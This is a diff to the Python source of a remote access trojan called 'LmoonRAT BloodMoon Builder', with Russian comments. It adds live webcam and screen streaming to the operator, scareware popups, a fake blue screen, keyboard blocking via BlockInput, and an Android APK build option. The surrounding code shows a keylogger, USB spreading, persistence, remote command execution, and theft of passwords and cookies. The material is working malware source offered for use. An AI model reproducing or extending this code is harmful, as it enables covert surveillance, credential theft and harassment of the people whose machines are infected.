@@ -33,6 +33,12 @@ import re
 import hashlib
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+from pynput import keyboard
+import pyautogui
+import zipfile
+import py7zr
+import sys
+import traceback
 
 # ========== АВТОМАТИЧЕСКАЯ УСТАНОВКА ЗАВИСИМОСТЕЙ ==========
 def install_dependencies():
@@ -47,7 +53,11 @@ def install_dependencies():
         'opencv-python-headless',
         'pyaudio',
         'numpy',
-        'pycryptodome'
+        'pycryptodome',
+        'py7zr',
+        'pyautogui',
+        'kivy',
+        'buildozer'
     ]
     
     print("[*] Проверка зависимостей...")
@@ -118,6 +128,10 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 import hashlib
 from pynput import keyboard
+import pyautogui
+import random
+import tkinter as tk
+from tkinter import messagebox
 
 # === КОНФИГУРАЦИЯ КЛИЕНТА ===
 SAFE_MODE = {SAFE_MODE}          # Режим безопасного тестирования
@@ -138,6 +152,7 @@ ENCRYPT_COMMS = {ENCRYPT_COMMS}  # Шифрование коммуникации
 ENCRYPT_KEY = b"{ENCRYPT_KEY}"   # Ключ шифрования
 KEYLOGGER_ENABLED = {KEYLOGGER}  # Включение кейлоггера
 FILE_TRANSFER = {FILE_TRANSFER}  # Передача файлов
+ENABLE_PRANKS = {ENABLE_PRANKS}  # Включение приколов
 
 # Константы для ctypes
 DRIVE_REMOVABLE = 2
@@ -425,7 +440,6 @@ class LmoonClient:
         self.functions = {
             "cmd": self.execute_command,
             "download": self.download_file,
-            "screenshot": self.capture_screen,
             "keylog": self.keylogger_control,
             "info": self.send_system_info,
             "uninstall": self.uninstall_client,
@@ -435,14 +449,17 @@ class LmoonClient:
             "persist": self.enable_persistence,
             "usb_spread": self.enable_usb_spread,
             "camera": self.capture_camera,
-            "microphone": self.record_audio,
             "monitor": self.stream_monitor,
             "upload": self.upload_file,
             "keylog": self.keylogger_control,
+            "prank": self.handle_prank,
         }
         self.keylogger_active = False
         self.keylog = []
         self.keylogger_thread = None
+        self.camera_active = False
+        self.monitor_active = False
+        self.microphone_active = False
         
         # Информация для безопасного режима
         if SAFE_MODE:
@@ -541,7 +558,11 @@ class LmoonClient:
         if ENCRYPT_COMMS:
             data = encrypt_data(data, ENCRYPT_KEY)
             
-        self.connection.send(data)
+        try:
+            self.connection.send(data)
+        except:
+            if SAFE_MODE:
+                print("[SAFE] Ошибка отправки данных")
     
     def send_system_info(self, _=None):
         info = {
@@ -585,25 +606,6 @@ class LmoonClient:
                 self.send_data(b"File read error")
         else:
             self.send_data(b"File not found")
-    
-    def capture_screen(self, _):
-        try:
-            if SAFE_MODE:
-                print("[SAFE] Запрос скриншота экрана")
-                
-            with mss.mss() as sct:
-                monitor = sct.monitors[1]  # Основной монитор
-                sct_img = sct.grab(monitor)
-                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
-                
-                # Конвертируем в JPEG
-                buffer = io.BytesIO()
-                img.save(buffer, format="JPEG", quality=70)
-                img_bytes = buffer.getvalue()
-                
-                self.send_data(img_bytes)
-        except Exception as e:
-            self.send_data(f"Screenshot error: {str(e)}".encode())
     
     def start_keylogger(self):
         """Запуск кейлоггера"""
@@ -803,84 +805,52 @@ class LmoonClient:
             self.send_data(f"USB spread error: {str(e)}".encode())
     
     def capture_camera(self, _):
-        """Захват изображения с веб-камеры"""
+        """Потоковая передача с камеры"""
         if SAFE_MODE: 
             try:
-                self.send_data(b"Safe mode: camera capture disabled")
+                self.send_data(b"Safe mode: camera streaming disabled")
             except:
                 pass
             return
             
         try:
             # Открываем камеру
+            self.camera_active = True
             cap = cv2.VideoCapture(0)
             if not cap.isOpened():
                 self.send_data(b"Camera not available")
                 return
                 
-            # Читаем кадр
-            ret, frame = cap.read()
-            cap.release()
+            # Устанавливаем разрешение
+            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
             
-            if ret:
+            while self.camera_active:
+                # Читаем кадр
+                ret, frame = cap.read()
+                if not ret:
+                    break
+                    
                 # Конвертируем в JPEG
-                ret, buffer = cv2.imencode('.jpg', frame)
-                if ret:
-                    self.send_data(buffer.tobytes())
-                else:
-                    self.send_data(b"Image encode error")
-            else:
-                self.send_data(b"Capture error")
+                ret, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
+                if not ret:
+                    continue
+                    
+                img_bytes = buffer.tobytes()
+                
+                # Отправляем данные
+                self.send_data(img_bytes)
+                
+            cap.release()
+            self.send_data(b"Camera streaming stopped")
         except Exception as e:
             self.send_data(f"Camera error: {str(e)}".encode())
+        finally:
+            self.camera_active = False
     
-    def record_audio(self, _):
-        """Запись звука с микрофона"""
-        if SAFE_MODE: 
-            try:
-                self.send_data(b"Safe mode: microphone record disabled")
-            except:
-                pass
-            return
-            
-        try:
-            # Параметры записи
-            FORMAT = pyaudio.paInt16
-            CHANNELS = 1
-            RATE = 44100
-            CHUNK = 1024
-            RECORD_SECONDS = 10
-            
-            audio = pyaudio.PyAudio()
-            
-            # Открываем поток
-            stream = audio.open(format=FORMAT, channels=CHANNELS,
-                                rate=RATE, input=True,
-                                frames_per_buffer=CHUNK)
-            
-            frames = []
-            
-            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
-                data = stream.read(CHUNK)
-                frames.append(data)
-            
-            stream.stop_stream()
-            stream.close()
-            audio.terminate()
-            
-            # Создаем WAV файл в памяти
-            buffer = io.BytesIO()
-            wf = wave.open(buffer, 'wb')
-            wf.setnchannels(CHANNELS)
-            wf.setsampwidth(audio.get_sample_size(FORMAT))
-            wf.setframerate(RATE)
-            wf.writeframes(b''.join(frames))
-            wf.close()
-            
-            # Отправляем аудио
-            self.send_data(buffer.getvalue())
-        except Exception as e:
-            self.send_data(f"Microphone error: {str(e)}".encode())
+    def stop_camera(self):
+        """Остановка потока камеры"""
+        self.camera_active = False
     
     def stream_monitor(self, _):
         """Трансляция экрана в реальном времени"""
@@ -892,21 +862,14 @@ class LmoonClient:
             return
             
         try:
+            self.monitor_active = True
             with mss.mss() as sct:
                 monitor = sct.monitors[1]  # Основной монитор
                 
                 # Параметры сжатия
                 quality = 50  # Качество JPEG (0-100)
                 
-                while True:
-                    # Проверяем, есть ли команда на остановку
-                    try:
-                        if self.connection.recv(1024, socket.MSG_PEEK) == b'stop_monitor':
-                            self.connection.recv(1024)  # Очищаем буфер
-                            break
-                    except:
-                        pass
-                    
+                while self.monitor_active:
                     # Захват экрана
                     sct_img = sct.grab(monitor)
                     
@@ -926,6 +889,12 @@ class LmoonClient:
                     
         except Exception as e:
             self.send_data(f"Monitor error: {str(e)}".encode())
+        finally:
+            self.monitor_active = False
+    
+    def stop_monitor(self):
+        """Остановка трансляции экрана"""
+        self.monitor_active = False
     
     def upload_file(self, data):
         """Загрузка файла на клиент"""
@@ -965,6 +934,190 @@ class LmoonClient:
             except:
                 pass
             time.sleep(30)
+    
+    # ========== ФУНКЦИИ ПРИКОЛОВ ==========
+    def prank_invert_screen(self):
+        """Инверсия цветов экрана"""
+        if SAFE_MODE or not ENABLE_PRANKS:
+            return
+            
+        try:
+            # Создаем полноэкранное окно с инверсией цветов
+            root = tk.Tk()
+            root.attributes("-fullscreen", True)
+            root.attributes("-topmost", True)
+            
+            # Инвертируем цвета
+            canvas = tk.Canvas(root, bg='black', highlightthickness=0)
+            canvas.pack(fill=tk.BOTH, expand=True)
+            
+            # Захватываем скриншот
+            with mss.mss() as sct:
+                monitor = sct.monitors[1]
+                sct_img = sct.grab(monitor)
+                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+                img = img.convert("L")  # Инвертируем цвета
+                
+                # Конвертируем в Tkinter-совместимый формат
+                photo = ImageTk.PhotoImage(img)
+            
+            # Отображаем инвертированный скриншот
+            canvas.create_image(0, 0, image=photo, anchor=tk.NW)
+            
+            # Закрываем через 10 секунд
+            root.after(10000, root.destroy)
+            root.mainloop()
+        except:
+            pass
+
+    def prank_rotate_screen(self, angle=90):
+        """Поворот экрана"""
+        if SAFE_MODE or not ENABLE_PRANKS:
+            return
+            
+        try:
+            # Определение ориентации
+            orientations = {
+                0: 0,    # Default
+                90: 3,   # 90 degrees
+                180: 2,  # 180 degrees
+                270: 1   # 270 degrees
+            }
+            
+            # Поворачиваем основной дисплей
+            device = ctypes.c_void_p(None)
+            ctypes.windll.user32.EnumDisplayDevicesA(None, 0, ctypes.byref(device), 0)
+            
+            dm = win32api.EnumDisplaySettings(device.DeviceName, -1)
+            dm.DisplayOrientation = orientations.get(angle, 0)
+            win32api.ChangeDisplaySettingsEx(device.DeviceName, dm)
+        except:
+            pass
+
+    def prank_fake_bsod(self):
+        """Фейковый синий экран смерти"""
+        if SAFE_MODE or not ENABLE_PRANKS:
+            return
+            
+        try:
+            # Создаем полноэкранное окно синего цвета
+            bsod_window = tk.Tk()
+            bsod_window.attributes("-fullscreen", True)
+            bsod_window.configure(bg="#0078D7")
+            
+            # Добавляем текст ошибки
+            error_text = (
+                ":( Ваш ПК столкнулся с проблемой и нуждается в перезагрузке.\n\n"
+                "Мы просто собираем некоторые данные об ошибке, а затем автоматически перезагрузим компьютер.\n\n"
+                "100% завершено\n\n"
+                "Для получения дополнительной информации об этой ошибке и возможных исправлениях посетите:\n"
+                "https://windows.com/stopcode"
+            )
+            
+            tk.Label(
+                bsod_window, 
+                text=error_text, 
+                bg="#0078D7", 
+                fg="white", 
+                font=("Segoe UI", 20),
+                justify=tk.LEFT
+            ).pack(expand=True, padx=100, pady=100)
+            
+            # Задержка перед закрытием
+            bsod_window.after(10000, bsod_window.destroy)
+            bsod_window.mainloop()
+        except:
+            pass
+
+    def prank_disable_keyboard(self, seconds=30):
+        """Временное отключение клавиатуры"""
+        if SAFE_MODE or not ENABLE_PRANKS:
+            return
+            
+        def block_keyboard():
+            # Блокируем клавиатуру
+            ctypes.windll.user32.BlockInput(True)
+            time.sleep(seconds)
+            ctypes.windll.user32.BlockInput(False)
+        
+        threading.Thread(target=block_keyboard, daemon=True).start()
+
+    def prank_mouse_jiggler(self, duration=60):
+        """Случайное движение мыши"""
+        if SAFE_MODE or not ENABLE_PRANKS:
+            return
+            
+        def jiggle():
+            start_time = time.time()
+            while time.time() - start_time < duration:
+                x = random.randint(-50, 50)
+                y = random.randint(-50, 50)
+                pyautogui.move(x, y)
+                time.sleep(0.5)
+        
+        threading.Thread(target=jiggle, daemon=True).start()
+
+    def prank_annoying_popup(self, count=10):
+        """Надоедливые всплывающие окна"""
+        if SAFE_MODE or not ENABLE_PRANKS:
+            return
+            
+        def show_popups():
+            messages = [
+                "Ваш компьютер заражен!",
+                "Обнаружен вирус!",
+                "Системная ошибка!",
+                "Требуется немедленное действие!",
+                "Файлы повреждены!",
+                "Внимание: критическая ошибка!",
+                "Ваша система уязвима!",
+                "Обнаружена подозрительная активность!",
+                "Требуется обновление безопасности!",
+                "Внимание: ваши данные в опасности!"
+            ]
+            
+            for _ in range(count):
+                threading.Thread(
+                    target=messagebox.showerror,
+                    args=("ОШИБКА СИСТЕМЫ", random.choice(messages))
+                ).start()
+                time.sleep(0.5)
+        
+        threading.Thread(target=show_popups, daemon=True).start()
+
+    def prank_play_sound(self):
+        """Проигрывание случайного звука"""
+        if SAFE_MODE or not ENABLE_PRANKS:
+            return
+            
+        try:
+            sounds = [
+                "SystemExclamation", "SystemHand", "SystemQuestion",
+                "SystemStart", "SystemExit", "SystemAsterisk"
+            ]
+            ctypes.windll.user32.MessageBeep(0xFFFFFFFF)
+            ctypes.windll.winmm.PlaySoundW(random.choice(sounds), None, 0x0001)
+        except:
+            pass
+
+    def handle_prank(self, data):
+        """Обработка команд приколов"""
+        prank_type = data.split()[1]
+        
+        if prank_type == "invert_screen":
+            self.prank_invert_screen()
+        elif prank_type == "rotate_screen":
+            self.prank_rotate_screen(random.choice([90, 180, 270]))
+        elif prank_type == "fake_bsod":
+            self.prank_fake_bsod()
+        elif prank_type == "disable_keyboard":
+            self.prank_disable_keyboard(30)
+        elif prank_type == "mouse_jiggler":
+            self.prank_mouse_jiggler(60)
+        elif prank_type == "annoying_popup":
+            self.prank_annoying_popup(15)
+        elif prank_type == "play_sound":
+            self.prank_play_sound()
 
 # Точка входа
 if __name__ == "__main__":
@@ -1039,18 +1192,21 @@ class RatController:
         self.usb_spread = tk.BooleanVar(value=False)
         self.discord_webhook = tk.StringVar(value="")
         self.file_extension = tk.StringVar(value="")
-        self.test_mode = tk.BooleanVar(value=True)  # Тестовый режим по умолчанию
+        self.test_mode = tk.BooleanVar(value=True)
         self.camera_capture = tk.BooleanVar(value=False)
         self.microphone_record = tk.BooleanVar(value=False)
         self.encrypt_comms = tk.BooleanVar(value=False)
-        self.keylogger = tk.BooleanVar(value=False)      # Кейлоггер
-        self.file_transfer = tk.BooleanVar(value=False)  # Передача файлов
+        self.keylogger = tk.BooleanVar(value=False)
+        self.file_transfer = tk.BooleanVar(value=False)
+        self.safe_mode = tk.BooleanVar(value=True)
+        self.build_apk = tk.BooleanVar(value=False)
+        self.enable_pranks = tk.BooleanVar(value=False)
         
         # Красная цветовая схема
-        self.bg_color = "#1a0000"  # Темно-красный фон
-        self.accent_color = "#8B0000"  # Кроваво-красный акцент
-        self.highlight_color = "#ff0000"  # Ярко-красный для выделения
-        self.text_color = "#ffcccc"  # Светло-красный текст
+        self.bg_color = "#1a0000"
+        self.accent_color = "#8B0000"
+        self.highlight_color = "#ff0000"
+        self.text_color = "#ffcccc"
         
         self.setup_ui()
         self.clients = {}
@@ -1058,36 +1214,31 @@ class RatController:
         self.server_running = False
         self.start_server()
         self.stream_active = False
+        self.camera_active = False
+        self.microphone_active = False
         
     def setup_ui(self):
-        # Красный фон
         self.root.configure(bg=self.bg_color)
         
-        # Верхняя панель
         top_frame = tk.Frame(self.root, bg=self.accent_color, height=50)
         top_frame.pack(fill=tk.X)
         
-        # Кнопка меню (три полоски)
         self.menu_btn = tk.Button(top_frame, text="☰", bg=self.accent_color, fg=self.text_color, bd=0, 
                                  font=("Arial", 16), command=self.toggle_menu)
         self.menu_btn.pack(side=tk.LEFT, padx=15)
         
-        # Заголовок
         tk.Label(top_frame, text="LmoonRAT BloodMoon Builder", bg=self.accent_color, fg=self.highlight_color, 
                 font=("Arial", 14, "bold")).pack(side=tk.LEFT, padx=10)
         
-        # Статус сервера
         self.server_status = tk.Label(top_frame, text="Server: Stopped", bg=self.accent_color, fg="#ff6666", 
                                     font=("Arial", 10))
         self.server_status.pack(side=tk.RIGHT, padx=20)
         
-        # Боковое меню
         self.menu_frame = tk.Frame(self.root, bg="#330000", width=200)
         self.menu_frame.pack(side=tk.LEFT, fill=tk.Y)
         self.menu_frame.pack_propagate(False)
         self.menu_frame.place(x=-200, y=50, height=650)
         
-        # Стиль для кнопок меню
         menu_btn_style = {
             "bg": "#330000", "fg": self.text_color, "bd": 0, 
             "font": ("Arial", 11), "anchor": "w",
@@ -1095,7 +1246,6 @@ class RatController:
             "activebackground": "#8B0000"
         }
         
-        # Пункты меню
         tk.Button(self.menu_frame, text="👥 Пользователи", command=lambda: self.show_tab(0), **menu_btn_style).pack(fill=tk.X)
         tk.Button(self.menu_frame, text="🛠️ Билдер", command=lambda: self.show_tab(1), **menu_btn_style).pack(fill=tk.X)
         tk.Button(self.menu_frame, text="💻 Консоль", command=lambda: self.show_tab(2), **menu_btn_style).pack(fill=tk.X)
@@ -1103,30 +1253,24 @@ class RatController:
         tk.Button(self.menu_frame, text="❓ Помощь", command=lambda: self.show_tab(4), **menu_btn_style).pack(fill=tk.X)
         tk.Button(self.menu_frame, text="🔒 Завершить", command=self.root.destroy, **menu_btn_style).pack(side=tk.BOTTOM, fill=tk.X)
         
-        # Создаем вкладки
         self.tab_control = ttk.Notebook(self.root)
         style = ttk.Style()
         style.configure("TNotebook", background=self.bg_color)
         style.configure("TNotebook.Tab", background="#330000", foreground=self.text_color, padding=[10, 5])
         style.map("TNotebook.Tab", background=[("selected", "#660000")])
         
-        # Вкладка: Пользователи
         self.tab_users = ttk.Frame(self.tab_control)
         self.setup_users_tab()
         
-        # Вкладка: Билдер
         self.tab_builder = ttk.Frame(self.tab_control)
         self.setup_builder_tab()
         
-        # Вкладка: Консоль
         self.tab_console = ttk.Frame(self.tab_control)
         self.setup_console_tab()
         
-        # Вкладка: Настройки
         self.tab_settings = ttk.Frame(self.tab_control)
         self.setup_settings_tab()
         
-        # Вкладка: Помощь
         self.tab_help = ttk.Frame(self.tab_control)
         self.setup_help_tab()
         
@@ -1136,26 +1280,21 @@ class RatController:
         self.tab_control.add(self.tab_settings, text='Настройки')
         self.tab_control.add(self.tab_help, text='Помощь')
         self.tab_control.place(x=0, y=50, width=1200, height=650)
-        self.tab_control.select(0)  # Выбираем первую вкладку
+        self.tab_control.select(0)
         
-        # Статус бар
         self.status = tk.Label(self.root, text="Готов к работе", 
                              bg="#8B0000", fg=self.text_color, anchor=tk.W)
         self.status.pack(fill=tk.X, side=tk.BOTTOM)
     
     def toggle_menu(self):
-        """Показ/скрытие бокового меню"""
         x_pos = 0 if self.menu_visible else -200
         self.menu_frame.place(x=x_pos, y=50, height=650)
         self.menu_visible = not self.menu_visible
     
     def show_tab(self, index):
-        """Показать выбранную вкладку"""
         tabs = self.tab_control.tabs()
         if index < len(tabs):
             self.tab_control.select(tabs[index])
-        
-        # Закрываем меню после выбора
         self.menu_frame.place(x=-200, y=50, height=650)
         self.menu_visible = False
     
@@ -1163,63 +1302,54 @@ class RatController:
         frame = ttk.Frame(self.tab_users)
         frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
         
-        # Таблица пользователей
         columns = ("IP", "Страна", "ID", "Без.режим", "ОС", "Статус", "Дата")
         self.tree = ttk.Treeview(frame, columns=columns, show="headings", height=20)
         
-        # Настройка стиля
         style = ttk.Style()
         style.configure("Treeview", background="#330000", foreground=self.text_color, fieldbackground="#330000")
         style.configure("Treeview.Heading", background="#660000", foreground=self.text_color)
         style.map("Treeview", background=[('selected', '#8B0000')])
         
-        # Настройка колонок
         col_widths = [120, 80, 150, 80, 150, 80, 120]
         for col, width in zip(columns, col_widths):
             self.tree.heading(col, text=col)
             self.tree.column(col, width=width, anchor=tk.CENTER)
         
-        # Скроллбар
         scrollbar = ttk.Scrollbar(frame, orient="vertical", command=self.tree.yview)
         self.tree.configure(yscrollcommand=scrollbar.set)
         
         scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
         self.tree.pack(fill=tk.BOTH, expand=True)
         
-        # Контекстное меню
         self.context_menu = tk.Menu(self.root, tearoff=0)
         self.context_menu.add_command(label="Выполнить команду", command=self.execute_selected)
-        self.context_menu.add_command(label="Сделать скриншот", command=self.screenshot_selected)
-        self.context_menu.add_command(label="Сделать фото с камеры", command=self.capture_camera_selected)
-        self.context_menu.add_command(label="Записать звук с микрофона", command=self.record_audio_selected)
-        self.context_menu.add_command(label="Трансляция экрана", command=self.stream_monitor_selected)
+        self.context_menu.add_command(label="Демонстрация экрана", command=self.stream_monitor_selected)
+        self.context_menu.add_command(label="Демонстрация камеры", command=self.capture_camera_selected)
         self.context_menu.add_command(label="Получить пароли", command=self.get_passwords)
         self.context_menu.add_command(label="Получить cookies", command=self.get_cookies)
         self.context_menu.add_command(label="Получить все данные", command=self.get_all_data)
         self.context_menu.add_command(label="Управление кейлоггером", command=self.keylogger_control)
         self.context_menu.add_command(label="Загрузить файл", command=self.upload_file)
+        self.context_menu.add_command(label="Приколы", command=self.show_prank_menu)
         self.context_menu.add_command(label="Удалить клиент", command=self.uninstall_selected)
         self.context_menu.add_separator()
         self.context_menu.add_command(label="Обновить информацию", command=self.refresh_clients)
         
-        # Привязка правой кнопки мыши
         self.tree.bind("<Button-3>", self.show_context_menu)
         
-        # Панель инструментов
         toolbar = tk.Frame(frame, bg="#330000")
         toolbar.pack(fill=tk.X, pady=5)
         
         actions = [
             ("Обновить", self.refresh_clients, "#8B0000"),
             ("Выполнить команду", self.execute_selected, "#B22222"),
-            ("Скриншот", self.screenshot_selected, "#CD5C5C"),
+            ("Экран", self.stream_monitor_selected, "#CD5C5C"),
             ("Камера", self.capture_camera_selected, "#DC143C"),
-            ("Микрофон", self.record_audio_selected, "#FF4500"),
-            ("Монитор", self.stream_monitor_selected, "#FF6347"),
             ("Пароли", self.get_passwords, "#FF69B4"),
             ("Cookies", self.get_cookies, "#DA70D6"),
             ("Все данные", self.get_all_data, "#9370DB"),
             ("Кейлоггер", self.keylogger_control, "#8A2BE2"),
+            ("Приколы", self.show_prank_menu, "#FF00FF"),
             ("Загрузить файл", self.upload_file, "#00CED1"),
             ("Удалить", self.uninstall_selected, "#FF0000"),
         ]
@@ -1231,7 +1361,6 @@ class RatController:
             btn.pack(side=tk.LEFT, padx=5, ipadx=5, ipady=3)
     
     def show_context_menu(self, event):
-        """Показать контекстное меню для выбранного клиента"""
         item = self.tree.identify_row(event.y)
         if item:
             self.tree.selection_set(item)
@@ -1241,11 +1370,9 @@ class RatController:
         frame = ttk.Frame(self.tab_builder)
         frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
         
-        # Основные настройки
         main_settings = ttk.LabelFrame(frame, text="Основные настройки")
         main_settings.pack(fill=tk.X, padx=5, pady=5)
         
-        # Сетка для основных настроек
         tk.Label(main_settings, text="IP сервера:", bg=self.bg_color, fg=self.text_color).grid(row=0, column=0, sticky="w", padx=5, pady=5)
         self.ip_entry = tk.Entry(main_settings, width=25, bg="#330000", fg=self.text_color)
         self.ip_entry.insert(0, "127.0.0.1")
@@ -1271,12 +1398,9 @@ class RatController:
         tk.Entry(main_settings, textvariable=self.icon_path, width=20, bg="#330000", fg=self.text_color).grid(row=2, column=1, padx=5, pady=5, sticky="w")
         tk.Button(main_settings, text="Обзор", command=self.select_icon, width=8, bg="#660000", fg="white").grid(row=2, column=2, padx=5, pady=5)
         
-        # Настройки безопасности
         sec_settings = ttk.LabelFrame(frame, text="Настройки безопасности")
         sec_settings.pack(fill=tk.X, padx=5, pady=5)
         
-        # Сетка для настроек безопасности
-        self.safe_mode = tk.BooleanVar(value=True)
         tk.Checkbutton(
             sec_settings, 
             text="Безопасный режим (для теста)", 
@@ -1300,11 +1424,9 @@ class RatController:
             bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
         ).grid(row=0, column=2, sticky="w", padx=5, pady=5)
         
-        # Дополнительные функции
         func_settings = ttk.LabelFrame(frame, text="Дополнительные функции")
         func_settings.pack(fill=tk.X, padx=5, pady=5)
         
-        # Сетка для дополнительных функций
         tk.Checkbutton(
             func_settings, 
             text="Скрыть файл", 
@@ -1363,17 +1485,10 @@ class RatController:
         
         tk.Checkbutton(
             func_settings, 
-            text="Запись микрофона", 
-            variable=self.microphone_record,
-            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
-        ).grid(row=2, column=1, sticky="w", padx=5, pady=5)
-        
-        tk.Checkbutton(
-            func_settings, 
             text="Шифрование связи", 
             variable=self.encrypt_comms,
             bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
-        ).grid(row=2, column=2, sticky="w", padx=5, pady=5)
+        ).grid(row=2, column=1, sticky="w", padx=5, pady=5)
         
         tk.Checkbutton(
             func_settings, 
@@ -1391,21 +1506,33 @@ class RatController:
         
         tk.Checkbutton(
             func_settings, 
+            text="Включить приколы", 
+            variable=self.enable_pranks,
+            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
+        ).grid(row=3, column=2, sticky="w", padx=5, pady=5)
+        
+        tk.Checkbutton(
+            func_settings, 
+            text="Сборка APK (Android)", 
+            variable=self.build_apk,
+            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
+        ).grid(row=3, column=3, sticky="w", padx=5, pady=5)
+        
+        tk.Checkbutton(
+            func_settings, 
             text="Тестовый режим (localhost)", 
             variable=self.test_mode,
             bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
         ).grid(row=2, column=3, sticky="w", padx=5, pady=5)
         
-        # Поле для Discord Webhook
         webhook_frame = tk.Frame(func_settings, bg=self.bg_color)
-        webhook_frame.grid(row=3, column=2, columnspan=2, sticky="we", padx=5, pady=5)
+        webhook_frame.grid(row=4, column=0, columnspan=4, sticky="we", padx=5, pady=5)
         
         tk.Label(webhook_frame, text="Discord Webhook URL:", bg=self.bg_color, fg=self.text_color).pack(side=tk.LEFT, padx=5)
         self.discord_webhook_entry = tk.Entry(webhook_frame, width=50, textvariable=self.discord_webhook, bg="#330000", fg=self.text_color)
         self.discord_webhook_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
         tk.Button(webhook_frame, text="Тест", command=self.test_webhook, width=5, bg="#660000", fg="white").pack(side=tk.RIGHT, padx=5)
         
-        # Кнопка сборки
         build_frame = tk.Frame(frame, bg=self.bg_color)
         build_frame.pack(fill=tk.X, pady=10)
         
@@ -1416,7 +1543,6 @@ class RatController:
         tk.Button(build_frame, text="Открыть папку сборки", command=self.open_build_dir, 
                  bg="#B22222", fg="white", activebackground="#CD5C5C").pack(side=tk.LEFT, padx=5)
         
-        # Консоль вывода
         console_frame = ttk.LabelFrame(frame, text="Лог сборки")
         console_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         
@@ -1445,7 +1571,6 @@ class RatController:
         frame = ttk.Frame(self.tab_settings)
         frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
         
-        # Настройки сервера
         server_frame = ttk.LabelFrame(frame, text="Настройки сервера")
         server_frame.pack(fill=tk.X, padx=5, pady=5)
         
@@ -1457,7 +1582,6 @@ class RatController:
         self.max_clients = tk.IntVar(value=100)
         tk.Entry(server_frame, textvariable=self.max_clients, width=10, bg="#330000", fg=self.text_color).grid(row=0, column=3, padx=5, pady=5)
         
-        # Настройки безопасности
         sec_frame = ttk.LabelFrame(frame, text="Настройки безопасности")
         sec_frame.pack(fill=tk.X, padx=5, pady=5)
         
@@ -1485,7 +1609,6 @@ class RatController:
             bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
         ).grid(row=0, column=2, sticky="w", padx=5, pady=5)
         
-        # Кнопки
         btn_frame = tk.Frame(frame, bg=self.bg_color)
         btn_frame.pack(fill=tk.X, pady=10)
         
@@ -1499,7 +1622,6 @@ class RatController:
         frame = ttk.Frame(self.tab_help)
         frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
         
-        # Информационный текст
         help_text = """
         LmoonRAT BloodMoon Builder - Руководство пользователя
         
@@ -1527,7 +1649,9 @@ class RatController:
         Новые функции:
         - Кейлоггер: запись всех нажатий клавиш
         - Передача файлов: загрузка файлов на клиент
+        - Система приколов: шуточные действия на удаленном ПК
         - Улучшенная живучесть: клиент не исчезает при закрытии окна
+        - Сборка APK для Android
         
         Безопасный режим:
         - Рекомендуется для тестов на основном ПК
@@ -1548,7 +1672,6 @@ class RatController:
                              bg=self.bg_color, fg=self.text_color)
         help_label.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
         
-        # Кнопки быстрого доступа
         btn_frame = tk.Frame(frame, bg=self.bg_color)
         btn_frame.pack(fill=tk.X, pady=10)
         
@@ -1627,31 +1750,24 @@ class RatController:
                     break
     
     def show_notification(self, message):
-        """Показать всплывающее уведомление"""
-        # Создаем временное окно уведомления
         notif = tk.Toplevel(self.root)
-        notif.overrideredirect(True)  # Убираем рамку
-        notif.geometry("300x60+900+10")  # Позиция в правом верхнем углу
-        notif.attributes("-topmost", True)  # Поверх всех окон
-        notif.attributes("-alpha", 0.9)  # Полупрозрачность
+        notif.overrideredirect(True)
+        notif.geometry("300x60+900+10")
+        notif.attributes("-topmost", True)
+        notif.attributes("-alpha", 0.9)
         
-        # Красный фон
         notif_bg = "#330000"
         notif_highlight = "#8B0000"
         
-        # Заголовок
         tk.Label(notif, text="Новое подключение", bg=notif_highlight, fg="white", 
                 font=("Arial", 10, "bold")).pack(fill=tk.X)
         
-        # Текст сообщения
         tk.Label(notif, text=message, bg=notif_bg, fg="#ff9999", 
                 font=("Arial", 9)).pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
         
-        # Автоматическое закрытие через 3 секунды
         notif.after(3000, notif.destroy)
     
     def log(self, message, msg_type="info"):
-        """Логирование с цветовой маркировкой"""
         colors = {
             "info": "#73daca",
             "success": "#00ff00",
@@ -1671,11 +1787,9 @@ class RatController:
                     break
                 
                 try:
-                    # Пытаемся декодировать JSON
                     client_info = json.loads(data.decode())
                     self.add_client(conn, addr, client_info)
                 except json.JSONDecodeError:
-                    # Если не JSON, выводим как есть
                     self.cmd_output.insert(tk.END, f"{addr[0]}: {data.decode()}\n")
                     self.cmd_output.see(tk.END)
                 except Exception as e:
@@ -1703,11 +1817,9 @@ class RatController:
             "is_vm": client_info.get("is_vm", False)
         }
         
-        # Обновляем GUI в основном потоке
         self.root.after(0, self.add_client_to_table, addr[0], client_info)
     
     def add_client_to_table(self, ip, client_info):
-        # Определяем страну по IP (демо)
         country = "UA" if random.random() > 0.5 else "RU"
         safe_status = "ДА" if client_info.get("safe_mode", False) else "НЕТ"
         vm_status = "ДА" if client_info.get("is_vm", False) else "НЕТ"
@@ -1722,14 +1834,12 @@ class RatController:
             client_info.get("join_date", "N/A")
         ))
         
-        # Обновляем статус бар
         self.status.config(text=f"Клиентов: {len(self.clients)} | ВМ: {sum(1 for c in self.clients.values() if c['is_vm'])} | Безопасные: {sum(1 for c in self.clients.values() if c['safe_mode'])}")
     
     def remove_client(self, ip):
         if ip in self.clients:
             del self.clients[ip]
             
-            # Удаляем из таблицы
             for child in self.tree.get_children():
                 if self.tree.item(child, "values")[0] == ip:
                     self.tree.delete(child)
@@ -1738,7 +1848,6 @@ class RatController:
